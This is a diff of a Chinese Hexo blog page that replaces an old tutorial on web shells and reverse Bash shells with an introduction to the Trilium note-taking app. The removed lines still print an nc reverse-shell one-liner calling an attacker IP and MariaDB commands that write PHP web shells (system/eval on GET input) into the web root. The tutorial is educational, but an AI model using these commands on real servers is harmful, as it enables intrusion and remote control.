@@ -19,26 +19,25 @@
   <meta name="author" content="Artibix">
   <meta name="keywords" content="">
   
-    <meta name="description" content="旧文整理：WebShell（网络后门）通过 Web 服务器获取控制权限；反弹 Bash 通过主动连接攻击者的主机来建立一个交互式的 Shell 会话。">
+    <meta name="description" content="Trilium Notes 开源、跨平台的个人笔记管理软件，可以方便结构化的管理大量笔记，层级无限制，支持多种笔记类型，非常适合用来管理自己的日记、笔记、工作等信息。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="获取 WebShell 和反弹 Bash">
-<meta property="og:url" content="https://artibix.github.io/reverse-shell/index.html">
+<meta property="og:title" content="如何使用 Trilium 做笔记">
+<meta property="og:url" content="https://artibix.github.io/tools-triliumnext/index.html">
 <meta property="og:site_name" content="Artibix&#39;s Blogs">
-<meta property="og:description" content="旧文整理：WebShell（网络后门）通过 Web 服务器获取控制权限；反弹 Bash 通过主动连接攻击者的主机来建立一个交互式的 Shell 会话。">
+<meta property="og:description" content="Trilium Notes 开源、跨平台的个人笔记管理软件，可以方便结构化的管理大量笔记，层级无限制，支持多种笔记类型，非常适合用来管理自己的日记、笔记、工作等信息。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://artibix.github.io/img/cover_reverse_shell.jpg">
-<meta property="article:published_time" content="2021-04-28T14:23:26.000Z">
-<meta property="article:modified_time" content="2024-10-12T03:02:31.423Z">
+<meta property="og:image" content="https://artibix.github.io/img/cover_trilium.png">
+<meta property="article:published_time" content="2024-10-12T08:57:39.000Z">
+<meta property="article:modified_time" content="2024-10-12T14:11:28.407Z">
 <meta property="article:author" content="Artibix">
-<meta property="article:tag" content="nc">
-<meta property="article:tag" content="渗透">
-<meta property="article:tag" content="Bash">
+<meta property="article:tag" content="Notes">
+<meta property="article:tag" content="Trilium">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://artibix.github.io/img/cover_reverse_shell.jpg">
+<meta name="twitter:image" content="https://artibix.github.io/img/cover_trilium.png">
   
   
   
-  <title>获取 WebShell 和反弹 Bash - Artibix&#39;s Blogs</title>
+  <title>如何使用 Trilium 做笔记 - Artibix&#39;s Blogs</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -204,7 +203,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="获取 WebShell 和反弹 Bash"></span>
+            <span id="subtitle" data-typed-text="如何使用 Trilium 做笔记"></span>
           
         </div>
 
@@ -215,8 +214,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2021-04-28 22:23" pubdate>
-          2021年4月28日 晚上
+        <time datetime="2024-10-12 16:57" pubdate>
+          2024年10月12日 下午
         </time>
       </span>
     
@@ -227,7 +226,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          810 字
+          928 字
         
       </span>
     
@@ -238,7 +237,7 @@
         
         
         
-          7 分钟
+          8 分钟
         
       </span>
     
@@ -275,110 +274,56 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">获取 WebShell 和反弹 Bash</h1>
+            <h1 id="seo-header">如何使用 Trilium 做笔记</h1>
             
             
               <div class="markdown-body">
                 
-                <p>旧文整理：WebShell（网络后门）通过 Web 服务器获取控制权限；反弹 Bash 通过主动连接攻击者的主机来建立一个交互式的 Shell 会话。</p>
+                <p>Trilium Notes 开源、跨平台的个人笔记管理软件，可以方便结构化的管理大量笔记，层级无限制，支持多种笔记类型，非常适合用来管理自己的日记、笔记、工作等信息。</p>
 <span id="more"></span>
 
-<h2 id="反弹-BASH"><a href="#反弹-BASH" class="headerlink" title="反弹 BASH"></a>反弹 BASH</h2><p>与 SSH 的区别在于，可以让目标主机主动连接黑客的主机，从而绕过防火墙的限制。</p>
-<h3 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h3><p>最常用的反弹 Bash 方式是利用 nc（netcat）工具，黑客在自己电脑上监听端口</p>
-<figure><div class="code-wrapper"><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token operator">&lt;</span> 端口 <span class="token operator">></span></code></pre></div></figure>
-
-<ul>
-<li><code>-l</code>: 监听模式。</li>
-<li><code>-v</code>: 显示详细的信息。</li>
-<li><code>-n</code>: 不进行域名解析。</li>
-<li><code>-p &lt; 端口 &gt;</code>: 监听的端口号。</li>
-</ul>
-<p>在目标主机执行</p>
-<figure><div class="code-wrapper"><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">>&amp;</span> /dev/tcp/<span class="token operator">&lt;</span> 攻击者 IP<span class="token operator">></span>/<span class="token operator">&lt;</span> 端口 <span class="token operator">></span> <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span></code></pre></div></figure>
-
-<ul>
-<li><p><code>-i</code>: 交互式 shell</p>
-</li>
-<li><p><code>&amp;&gt;</code>: 将标准输出和错误进行重定向</p>
-</li>
-<li><p><code>/dev/tcp/ip/port</code>: bash 建立 socket 的一种特殊写法，除此之外还有 udp</p>
-</li>
-<li><p><code>&lt;&amp;1</code>: 把标准输入重定向到标准输出，其他写法 <code>0&gt;&amp;1</code></p>
-</li>
-</ul>
-<div class="note note-primary">
-            <p>什么？你要问我都能连接到靶机执行指令了还要什么 nc？哼哼，黑客通常是使用各种漏洞连接到靶机，使用 nc 只是为了更方便的执行系统指令。</p><p>比如利用数据库漏洞执行 nc 反弹 bash</p><figure><div class="code-wrapper"><pre class="language-bash" data-language="bash"><code class="language-bash">system <span class="token function">bash</span> <span class="token parameter variable">-c</span> <span class="token string">'bash -i &amp;> /dev/tcp/&#123;外部机器 IP&#125;/&#123;端口&#125; &lt;&amp;1'</span></code></pre></div></figure>
-          </div>
-
-<h2 id="Web-Shell"><a href="#Web-Shell" class="headerlink" title="Web Shell"></a>Web Shell</h2><p>利用 Web 服务器漏洞执行 shell 指令，下面演示利用 PHP + MariaDB 写入一个后门文件。</p>
-<h3 id="利用-secure-file-priv"><a href="#利用-secure-file-priv" class="headerlink" title="利用 secure_file_priv"></a>利用 secure_file_priv</h3><p>主要用于限制数据库对文件系统的访问。它规定 MySQL 服务器可以进行文件导入导出操作的目录。</p>
-<figure><div class="code-wrapper"><pre class="language-sql" data-language="sql"><code class="language-sql">MariaDB root@<span class="token punctuation">(</span>none<span class="token punctuation">)</span>:<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">'% secure%'</span>
-<span class="token operator">|</span> Variable_name            <span class="token operator">|</span> <span class="token keyword">Value</span>   <span class="token operator">|</span>
-<span class="token operator">|</span><span class="token comment">--------------------------|---------|</span>
-<span class="token operator">|</span> require_secure_transport <span class="token operator">|</span> <span class="token keyword">OFF</span>     <span class="token operator">|</span>
-<span class="token operator">|</span> secure_auth              <span class="token operator">|</span> <span class="token keyword">ON</span>      <span class="token operator">|</span>
-<span class="token operator">|</span> secure_file_priv         <span class="token operator">|</span>         <span class="token operator">|</span>
-<span class="token operator">|</span> secure_timestamp         <span class="token operator">|</span> <span class="token keyword">NO</span>      <span class="token operator">|</span></code></pre></div></figure>
-
-<ul>
-<li>空字符串（’’）： 不限制导入导出目录，MySQL 可以在任意目录进行文件操作。</li>
-<li>指定目录： 只能在指定的目录进行导入导出操作。例如：secure_file_priv&#x3D;’&#x2F;var&#x2F;lib&#x2F;mysql’</li>
-<li>NULL： 禁止所有的文件导入导出操作，包括 LOAD DATA INFILE、SELECT … INTO OUTFILE 和 LOAD_FILE () 函数。</li>
-</ul>
-<p>然后查看用户是否具有 IO 权限</p>
-<figure><div class="code-wrapper"><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> group_concat <span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span>file_priv<span class="token punctuation">)</span> <span class="token keyword">from</span> mysql<span class="token punctuation">.</span><span class="token keyword">user</span><span class="token punctuation">;</span></code></pre></div></figure>
-
-<p>执行代码将后门输出到服务器</p>
-<figure><div class="code-wrapper"><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token string">"&lt;?php @system ($_GET ['cmd']);?>"</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'/srv/http/houmen.php'</span><span class="token punctuation">;</span></code></pre></div></figure>
-
-<p>接下来就可以利用这个文件为所欲为啦</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static//img/article/2021/webshell.png" srcset="/img/loading.gif" lazyload></p>
-<h3 id="利用-general-log"><a href="#利用-general-log" class="headerlink" title="利用 general_log"></a>利用 general_log</h3><p>如果上面的 <code>secure_file_priv</code> 规定了输出目录或者是 NULL，还可以使用 <code>general_log</code> 的方法来写 shell，它记录所有基础日志，默认关闭状态。</p>
-<ol>
-<li>模糊查找关于 general 的信息</li>
-</ol>
-<figure><div class="code-wrapper"><pre class="language-sql" data-language="sql"><code class="language-sql">MariaDB root@<span class="token punctuation">(</span>none<span class="token punctuation">)</span>:<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">'% general%'</span>
-<span class="token operator">|</span> Variable_name    <span class="token operator">|</span> <span class="token keyword">Value</span>            <span class="token operator">|</span>
-<span class="token operator">|</span><span class="token comment">------------------|------------------|</span>
-<span class="token operator">|</span> general_log      <span class="token operator">|</span> <span class="token keyword">OFF</span>              <span class="token operator">|</span>
-<span class="token operator">|</span> general_log_file <span class="token operator">|</span>                  <span class="token operator">|</span></code></pre></div></figure>
-
-<ol start="2">
-<li>开启 general_log，设置路径</li>
-</ol>
-<figure><div class="code-wrapper"><pre class="language-sql" data-language="sql"><code class="language-sql">MariaDB root@<span class="token punctuation">(</span>none<span class="token punctuation">)</span>:<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">set</span> <span class="token keyword">global</span> general_log <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
-MariaDB root@<span class="token punctuation">(</span>none<span class="token punctuation">)</span>:<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">set</span> <span class="token keyword">global</span> general_log_file <span class="token operator">=</span> <span class="token string">'/srv/http/hm.php'</span><span class="token punctuation">;</span>
-MariaDB root@<span class="token punctuation">(</span>none<span class="token punctuation">)</span>:<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">'% general%'</span>
-<span class="token operator">|</span> Variable_name    <span class="token operator">|</span> <span class="token keyword">Value</span>            <span class="token operator">|</span>
-<span class="token operator">|</span><span class="token comment">------------------|------------------|</span>
-<span class="token operator">|</span> general_log      <span class="token operator">|</span> <span class="token keyword">ON</span>               <span class="token operator">|</span>
-<span class="token operator">|</span> general_log_file <span class="token operator">|</span> <span class="token operator">/</span>srv<span class="token operator">/</span>http<span class="token operator">/</span>hm<span class="token punctuation">.</span>php <span class="token operator">|</span></code></pre></div></figure>
-
-<ol start="3">
-<li>写入数据</li>
-</ol>
-<figure><div class="code-wrapper"><pre class="language-sql" data-language="sql"><code class="language-sql">MariaDB root@<span class="token punctuation">(</span>none<span class="token punctuation">)</span>:<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> <span class="token string">"&lt;?php @eval ($_GET ['command']);?>"</span></code></pre></div></figure>
-
-<figure><div class="code-wrapper"><pre class="language-php" data-language="php"><code class="language-php">> sudo cat /srv/http/hm.php
-/usr/bin/mariadbd, Version: 10.5.9-MariaDB (Arch Linux). started with:
-Tcp port: 3306  Unix socket: /run/mysqld/mysqld.sock
-Time                Id Command  Argument
-210429 17:29:36      3 Query    select "<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token function">system</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>"</code></pre></div></figure>
-
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>从第一接触 Markdown 开始，我就一直使用 Markdown 做笔记，后面将所有笔记都写在 Hexo 部署在 Github 上，缺点就是不够隐私。在大学看到同学使用 Notion 做笔记，我也眼馋它对笔记的各种整合，但是因为付费 + 闭源的原因，我还是坚持使用 typora 写笔记。</p>
+<p>在 Github 接触到了 Mrdoc（觅思文档），国人写的在线文档系统，分为开源版和付费版，具有多人写作、版本控制、多平台、导入导出等功能，于是我就将我之前的所有笔记迁移到了 Mrdoc，还买了阿里云的服务器部署，方便实时访问。</p>
+<p>随着笔记和想学的内容的增加，我认为开源版 Mrdoc 已经不适合做笔记（层级有限、笔记类型太少），对于我来说就是一个方便管理 md 文件的地方，没有额外的笔记功能。</p>
+<p>之前就已经注意了了 Trilium，但是一直没用时间迁移过来，忙着毕业和找工作。现在工作稳定了，为了更方便的学习知识，将博客和笔记分开记录，博客使用 Hexo，笔记使用 Trilium，数据备份到坚果云。接下来开始正式介绍、使用 Trilium。</p>
 <div class="note note-danger">
-            <p>如果数据库用户权限被严格管控了 IO，那么将无法实现上述步骤，比如在 Linux 里面，httpd 的用户是 http，mariadb 的用户是 mysql，默认情况下，mysql 无法写入，httpd 无法读取</p>
+            <p>请注意，本文只是介绍 Trilium 的优点和我查阅官方 Wiki 对它的理解，不涉及安装教程。<br>因为 Trilium 已经进入维护阶段，版本停留在了 0.63，我使用的是 Triliumnext，官方仓库在这 <a target="_blank" rel="noopener" href="https://github.com/TriliumNext/">https://github.com/TriliumNext/</a><br>相较原版，支持多语言，用 TS 重构，可自定义菜单栏。</p>
           </div>
 
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>后端只要满足三个条件就可以反弹 shell</p>
+<h2 id="Trilium-简介"><a href="#Trilium-简介" class="headerlink" title="Trilium 简介"></a>Trilium 简介</h2><p><img src="/img/trilium.png" srcset="/img/loading.gif" lazyload></p>
+<p>Trilium 是一款开源的、跨平台的笔记和知识管理应用程序，可以帮助用户高效地组织和管理信息。Trilium 采用树形结构来组织笔记，支持丰富的文本格式、嵌入各种媒体文件、自定义元数据，功能强大且灵活，非常适合用来管理个人笔记。下面我分层次解释 Trilium 的特点。</p>
+<h2 id="基础功能"><a href="#基础功能" class="headerlink" title="基础功能"></a>基础功能</h2><h3 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h3><p>所有笔记都在 root 下，以树形放置</p>
+<p><img src="/img/trilium_root.png" srcset="/img/loading.gif" lazyload></p>
+<p>Trilium 支持以下类型的笔记</p>
 <ul>
-<li>支持 tcp 链接</li>
-<li>支持 IO 重定向</li>
-<li>可以调用系统命令</li>
+<li>文本（使用 CKEditor）</li>
+<li>代码</li>
+<li>图像</li>
+<li>文件</li>
+<li>HTML</li>
+<li>关系图</li>
+<li>书评（针对一本书进行记录）</li>
+<li>Canvas</li>
+<li>Mermaid</li>
+<li>思维导图（Mind Map）</li>
+<li>归档</li>
 </ul>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
-<li><a target="_blank" rel="noopener" href="https://www.ascotbe.com/2020/07/21/DatabaseWriteWebshell/#post-comment">常见数据库写入 Webshell 汇总</a></li>
-<li><a target="_blank" rel="noopener" href="https://becivells.github.io/2019/01/bash_i_dev_tcp/">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;localhost&#x2F;8080 0&gt;&amp;1 的含义</a></li>
-</ul>
+<p><img src="/img/trilium_note_type.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="多层级"><a href="#多层级" class="headerlink" title="多层级"></a>多层级</h3><p>Trilium 支持无限层级，所有笔记都被视为同等重要的实体，不论哪个节点的笔记，都可以包含笔记内容</p>
+<pre><code class="mermaid">graph TD
+     A[根笔记] --> B[子笔记1]
+     A --> C[子笔记2]
+     B --> D[孙笔记1]
+     B --> E[孙笔记2]
+     C --> F[内容]
+     D --> G[内容]
+     E --> H[内容]</code></pre>
+<p>也就是说在 Trilium 里面，所有内容都是笔记，这样做将内容和结构进行分离，方便进行动态链接。</p>
+<h3 id="多次分类"><a href="#多次分类" class="headerlink" title="多次分类"></a>多次分类</h3><p>能够将一篇笔记放在不同的父级下，类似操作系统的 <strong>硬链接</strong>，但是不要忘了，Trilium 目录也可以作为笔记放在其他父级下，官方称之为 <strong>Cloning</strong>，但是实际上多了个引用，并不是真正的复制文件过去。</p>
+<h3 id="隐私笔记"><a href="#隐私笔记" class="headerlink" title="隐私笔记"></a>隐私笔记</h3><p>Trilium 支持将笔记内容加密，就算被获取了所有笔记，没有你设置的密码也无法获取笔记内容。</p>
+<p>加密的只是笔记内容，对于笔记的元数据和结构这些无法加密。</p>
+<h2 id="高级功能"><a href="#高级功能" class="headerlink" title="高级功能"></a>高级功能</h2><p>TODO</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://triliumnext.github.io/Docs/Wiki/patterns-of-personal-knowledge">https://triliumnext.github.io/Docs/Wiki/patterns-of-personal-knowledge</a></p>
 
                 
               </div>
@@ -397,7 +342,7 @@ Time                Id Command  Argument
     
       <span class="category-chain">
         
-  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="category-chain-item">网络安全</a>
+  <a href="/categories/Tools/" class="category-chain-item">Tools</a>
   
   
 
@@ -412,11 +357,9 @@ Time                Id Command  Argument
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/nc/" class="print-no-link">#nc</a>
+        <a href="/tags/Notes/" class="print-no-link">#Notes</a>
       
-        <a href="/tags/%E6%B8%97%E9%80%8F/" class="print-no-link">#渗透</a>
-      
-        <a href="/tags/Bash/" class="print-no-link">#Bash</a>
+        <a href="/tags/Trilium/" class="print-no-link">#Trilium</a>
       
     </div>
   
@@ -428,8 +371,8 @@ Time                Id Command  Argument
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>获取 WebShell 和反弹 Bash</div>
-      <div>https://artibix.github.io/reverse-shell/</div>
+      <div>如何使用 Trilium 做笔记</div>
+      <div>https://artibix.github.io/tools-triliumnext/</div>
     </div>
     <div class="license-meta">
       
@@ -441,7 +384,7 @@ Time                Id Command  Argument
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2021年4月28日</div>
+          <div>2024年10月12日</div>
         </div>
       
       
@@ -473,9 +416,9 @@ Time                Id Command  Argument
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/tools-triliumnext/" title="如何使用 Trilium 做笔记">
+                      <a href="/programming-specifications/" title="programming-specifications">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">如何使用 Trilium 做笔记</span>
+                        <span class="hidden-mobile">programming-specifications</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -483,8 +426,8 @@ Time                Id Command  Argument
                   <article class="post-next col-6">
                     
                     
-                      <a href="/wake-on-lan/" title="Manjaro + 微星 B365M 主板设置 Wake On Lan">
-                        <span class="hidden-mobile">Manjaro + 微星 B365M 主板设置 Wake On Lan</span>
+                      <a href="/reverse-shell/" title="获取 WebShell 和反弹 Bash">
+                        <span class="hidden-mobile">获取 WebShell 和反弹 Bash</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -586,6 +529,21 @@ Time                Id Command  Argument
 
   
 
+
+
+  <script>
+  Fluid.utils.createScript('https://lib.baomitu.com/mermaid/8.14.0/mermaid.min.js', function() {
+    mermaid.initialize({"theme":"default"});
+
+    Fluid.utils.listenDOMLoaded(function() {
+      Fluid.events.registerRefreshCallback(function() {
+        if ('mermaid' in window) {
+          mermaid.init();
+        }
+      });
+    });
+  });
+</script>
 
 
 
